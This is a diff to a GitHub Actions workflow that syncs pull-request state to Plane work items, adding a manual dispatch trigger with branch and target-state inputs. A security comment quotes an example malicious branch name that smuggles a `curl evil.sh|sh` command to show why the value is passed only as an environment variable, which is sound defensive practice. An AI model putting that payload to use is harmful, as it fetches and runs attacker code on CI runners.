@@ -35,7 +35,21 @@ on:
         default: PLANE_PROJECT_ID
   pull_request_target:
     types: [opened, reopened, ready_for_review, converted_to_draft, closed]
+  # By hand, for a read-back. Name the branch and the target state, and the run
+  # resolves the item the way a PR event would, PR link aside. The PET-502 definition
+  # of done is a dispatch against an item past the first page of the board.
   workflow_dispatch:
+    inputs:
+      head_ref:
+        description: "Head branch to resolve, e.g. pet-386-kuma-backup-to-ollama-host"
+        required: true
+        type: string
+      transition:
+        description: "Target state"
+        required: true
+        type: choice
+        options: [in-progress, in-review, done, todo]
+        default: done
 
 permissions:
   contents: read
@@ -74,10 +88,20 @@ jobs:
       - name: Resolve transition
         id: t
         env:
+          EVENT: ${{ github.event_name }}
           ACTION: ${{ github.event.action }}
           MERGED: ${{ github.event.pull_request.merged }}
           IS_DRAFT: ${{ github.event.pull_request.draft }}
+          DISPATCHED: ${{ github.event.inputs.transition }}
         run: |
+          # A dispatch names its transition. A caller repo's own workflow_dispatch
+          # arrives through workflow_call with no inputs, and skips as before.
+          if [ "$EVENT" = "workflow_dispatch" ]; then
+            T="${DISPATCHED:-skip}"
+            echo "transition=$T" >> "$GITHUB_OUTPUT"
+            echo "dispatched -> $T"
+            exit 0
+          fi
           case "$ACTION" in
             opened|reopened)      T=$([ "$IS_DRAFT" = "true" ] && echo in-progress || echo in-review) ;;
             ready_for_review)     T=in-review ;;
@@ -120,13 +144,14 @@ jobs:
       # INJECTION NOTE: HEAD_REF is attacker-controlled — anyone can open a PR from a
       # branch named `pet-1-$(curl evil.sh|sh)`. It is passed as an ENV VAR and never
       # interpolated into a shell string, and plane-sync.sh only ever regex-matches it.
+      # A dispatch input takes the same env-only path, and only write access can dispatch.
       # Runs even when the mint failed; the script skips cleanly on an empty key and
       # annotates why, so the nightly reconciler picks the work item up later.
       - name: Sync Plane
         if: steps.t.outputs.transition != 'skip'
         env:
           PLANE_TRANSITION: ${{ steps.t.outputs.transition }}
-          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref || github.event.inputs.head_ref }}
           PR_URL: ${{ github.event.pull_request.html_url }}
         run: |
           if [ -z "${PLANE_API_KEY:-}" ]; then
